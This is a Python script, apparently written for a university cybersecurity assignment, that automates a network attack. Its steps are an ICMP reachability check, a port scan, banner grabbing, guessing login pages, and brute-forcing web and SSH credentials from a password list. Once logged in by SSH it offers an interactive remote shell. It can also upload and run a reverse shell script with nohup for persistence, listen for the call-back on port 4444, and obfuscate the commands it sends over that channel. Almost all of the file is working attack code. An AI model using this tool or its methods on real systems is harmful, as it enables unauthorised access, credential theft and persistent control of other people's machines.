#!/usr/bin/python3

"""
Scripting for Cybersecurity (COMP9038)
Assignment 2 - Network Attack Automation
Student Name: Udbhav Singh Chauhan
Student Number: R00258663
Course: MSc in Cybersecurity

This is a python script/tool designed to automate the process of discovering weak usernames and passwords commonly used in network services like HTTP and SSH.
The script allows users to perform reconnaissance by targeting specific IPs and ports including features for active bruteforcing of credentials.
User can also choose to add persistence to the attack and later connect with the target using a netcat listener.

"""

import argparse
import socket
import requests
import paramiko
from scapy.all import *
conf.verb = 0 # Suppress all the verbose output of Scapy

def main():
  parser = argparse.ArgumentParser(prog="net_attack.py",description="Network Attack Tool",epilog="Author:Udbhav Singh Chauhan")
  parser.add_argument("-t", "--target", required=True, help="Target IP address")
  parser.add_argument("-p", "--ports", required=True, help="Comma-separated list of ports to scan")
  parser.add_argument("-u", "--username", required=True, help="Username for bruteforce attacks")
  parser.add_argument("-l", "--password-list", required=True, help="File containing password list")

  args = parser.parse_args()

  target = args.target
  ports = list(map(int, args.ports.split(","))) # Converts the list of strings to list of integers
  username = args.username
  password_list = args.password_list

  if checkConnectivity(target) == True: # If target is reachable
    port_states = scanPorts(target,ports) # Then scan its ports
    if 80 in ports and port_states[80] == 'open' and confirmHTTP(target,port=80) == True: # Checks if port 80 is open and HTTP service is running
      url = dirBuster(target) # Fetch accessible page with form element
      bruteforceWeb(target,url,username,password_list) # Bruteforces credentials on the accessible web page
    if 22 in ports and port_states[22] == 'open' and confirmSSH(target,port=22) == True: # Checks if port 22 is open and SSH service is running
      bruteforceSSH(target,username,password_list) # Bruteforces credentials for SSH connection and spwans a shell along with persistence
  else:
    print("Target is unreachable.")
    sys.exit(1) # Exit if target is unreachable

def checkConnectivity(target):
  packet = IP(dst=target) / ICMP() # Craft an ICMP packet and send it to target
  response = sr1(packet,timeout=5,verbose=0) # Store the response
  if response is not None: # Check response for an output. It should not be None.
    return True
  else:
    return False

def scanPorts(target,ports):
  print("-" * 30)
  port_states = {}
  services = {
      22:"SSH",
      23:"Telnet",
      25:"SMTP",
      53:"DNS",
      80:"HTTP",
      110:"POP3",
      143:"IMAP",
      443:"HTTPS",
      8080:"HTTPS-proxy",
  }

  print("Port\t"+"State\t"+"Service")
  print("-" * 30)

  # This loop connects to each port supplied by the user and checks its state (open/close) and updates it in port_states.

  for port in ports:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a socket object
    sock.settimeout(1)
    response = sock.connect_ex((target,port)) # Establish a connection to the server at the specified IP and port

    if response == 0:
      state = "open"
    else:
      state = "close"

    service = services.get(port, "Unknown") # Get service name using the [port number] as key 
    port_states[port] = state # Update state for the current port in port_states
    print(str(port)+"\t"+state+"\t"+service)
    sock.close()
  print("-" * 30)
  return port_states

def confirmSSH(target,port=22):
  sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  sock.settimeout(2)
  sock.connect((target,port))
  banner = sock.recv(1024).decode('ascii', errors='ignore') # Allowing 1024 bytes to be received after we connect and then grab the banner in respomse
  sock.close()
  if 'SSH' in banner: # Check if SSH service is running on the target
    return True
  else:
    return False

def confirmHTTP(target,port=80):
  sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  sock.settimeout(2)
  sock.connect((target,port))
  request = "GET / HTTP/1.1\r\nHost: "+target+"\r\n\r\n" # Craft an HTTP request
  sock.send(request.encode())
  response = sock.recv(1024).decode('ascii', errors='ignore') # Grab the banner in response
  sock.close()
  if 'HTTP' in response: # Check if HTTP service is running on the target
    return True
  else:
    return False

def dirBuster(target):
  pages = [
      "login.php",
      "admin.php",
      "admin/login.php",
      "admin/admin.php"
  ]
  base_url = "http://"+target

  # This loop sends a request to each page in pages and checks if it is accessible and contains a form element

  for page in pages:
    url = base_url+"/"+page
    response = requests.get(url,timeout=5)
    if response.status_code == 200:
      print("[+] Accessible page found: "+url)
      if "<form" in response.text:
        print("\t[-] HTML form detected on: "+url)
        return url

def bruteforceWeb(target,url,username,password_list):
  with open(password_list, 'r', errors='ignore') as f:
    passwords = [line.strip() for line in f.readlines()] # Reads the passwords from the password list and stores them
  response = requests.get(url,timeout=5)

  # Confirm if the url is accessible

  if response.status_code != 200:
    print("\t[-] Failed to access URL: "+url)
    return
  html = response.text
  username_field = "username"
  password_field = "password"

  # Searches for potential field names in html

  if 'name="' in html:
    name_index = html.find('name="')

    # If a name is found then extract it using character indexes

    while name_index != -1:
      field_start = name_index + 6
      field_end = html.find('"', field_start)
      field_name = html[field_start:field_end].lower()

      # And check if the field name contains user/login or pass/pwd
      # This logic d ynamically detect the username and password fields

      if "user" in field_name or "login" in field_name:
        username_field = field_name
      elif "pass" in field_name or "pwd" in field_name:
        password_field = field_name
      name_index = html.find('name="',field_end)

  for password in passwords: # Iterates through each password stored in the list
    payload = {
        username_field: username,
        password_field: password
    }

    # Bruteforces the accessible web page using the provided username and current password from the list

    login_response = requests.post(url, data=payload, timeout=5) # Stores the response of the request sent to the url
    if login_response.status_code == 200:
      if "welcome" in login_response.text.lower(): 
        print("\t[-] Successful login! Username: "+username+", Password: "+password)
        return True
  print("\t[-] Brute force failed. No valid credentials found.")
  return False

def bruteforceSSH(target,username,password_list):
  with open(password_list, 'r', errors='ignore') as f:
    passwords = [line.strip() for line in f.readlines()] # Reads the passwords from the password list and stores them
  print("[+] Starting SSH brute force on "+target)
  ssh_client = paramiko.SSHClient() # Create an instance of SSH client using paramiko to handle SSH connection to the target
  ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Automatically add target's host key to known hosts of the client without user confirmation
  for password in passwords: # Iterates through each password stored in the list
    try:
      ssh_client.connect(hostname=target,username=username,password=password) # Connects to the target using SSH client instance and bruteforces the target using the provided username and current password from the list
      print("\t[-] Successful login! Username: "+username+", Password: "+password)
      drop_shell = input("\t[-] Drop to shell on target "+target+"? (y/N/P):").strip().lower() # If login succeeds then ask the user if they want to spawn a shell or add persistence or do nothing
      
      # Spawning a shell:
      
      if drop_shell == 'y':
        print("[+] Entering interactive shell. Type 'exit' to leave.")
        while True:
          shell_input = input("Net_Attack$:").strip().lower() # Asks user to input a command in the interactive shell
          if(shell_input == 'exit'):
            break
          elif(shell_input == ""): # If command is empty then reiterate loop
            continue
          else:
            stdin, stdout, stderr = ssh_client.exec_command(shell_input) # Executes the command on the target using the SSH client instance
            shell_output = stdout.read() # Store the output
            error_output = stderr.read() # Store the errors if any
            shell_output = shell_output[0:-1] # Strips the new line characters and blank spaces
            decoded_shell_output = shell_output.decode() # Decode the output from bytes to str
            if decoded_shell_output != "": # If output is not empty then print output
              print(decoded_shell_output)
            elif error_output.decode() != "": # Else if output is empty but error output is not empty then print command failed
              print("Command failed.")
            else: # If output is empty and error output is empty then print command executed successfully with no output
              print("Command executed successfully.")
              
      # Adding persistence        
              
      elif drop_shell == 'p':
      
        # Move the reverse shell script to the target
        
        remote_path = "/home/"+username+"/shell.py"
        local_script = "shell.py"
        sftp = ssh_client.open_sftp()
        sftp.put(local_script,remote_path)
        sftp.close()
        
        # Execute the reverse shell script on the target
        
        command = "nohup python3 "+remote_path+" &"
        ssh_client.exec_command(command)
        
        print("[+] Persistent reverse shell is active.")
        print("\t[-] Listening for reverse shell connection on port 4444.")
        
        # Create a new instance of socket connection
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
          listener.bind(("172.17.0.1",4444)) # Listen for incoming connections to attacker's IP and port. The reverse shell script deployed on the target will connect back to the attacker.
          listener.listen(1) # Listen for an incoming connection. Any more connections after this will be refused.
          conn, addr = listener.accept() # Creates a new socket object and waits for the target to connect back to the socket and then accepts its connection
          print("\t[-] Reverse shell connection received from port 4444.")
          print("\t[-] You can use custom commands. Enter 'custom -h' for usage.")
          while True:
            command = input("Net_Attack$:") # Provides a reverse shell to the user
            if command.lower() == "exit":
              break
            elif command.lower() == "":
              continue
            ob_command = obfuscate(command) # Obfuscate the command provided by the user
            conn.sendall(ob_command.encode("ascii")) # Send the command using the socket object over to the target
            ob_response = conn.recv(4096).decode("ascii") # Allowing 4096 bytes to be received as response from the target
            response = deobfuscate(ob_response) # Deobfuscate the response
            if response != "": # If response is not empty then display else continue
              print(response.strip())
            else:
              continue
          conn.close() # Close the socket connection
      ssh_client.close() # Close the SSH client instance
      return
    except paramiko.AuthenticationException:
      pass
    except paramiko.SSHException as e:
      pass
    except Exception as e:
      pass
  print("Bruteforce failed. No valid credentials found.")

def obfuscate(plain_text):
  # Rotate the plain text
  rot_text = ""
  i = len(plain_text)-1
  while i >= 0:
    rot_text += plain_text[i]
    i-=1
  # Right shift each character in the rotated text by 3
  cipher_text = ""
  for char in rot_text:
    ascii_value = ord(char)
    ascii_value +=3
    cipher_text += chr(ascii_value)
  return cipher_text

def deobfuscate(cipher_text):
  # Left shift each character in cipher text by 3
  plain_text = ""
  rot_text = ""
  for char in cipher_text:
    ascii_value = ord(char)
    ascii_value -=3
    plain_text+=chr(ascii_value)
  # Rotate the plain text to reveal original message
  i = len(plain_text)-1
  while i >= 0:
    rot_text += plain_text[i]
    i-=1
  return rot_text

main()
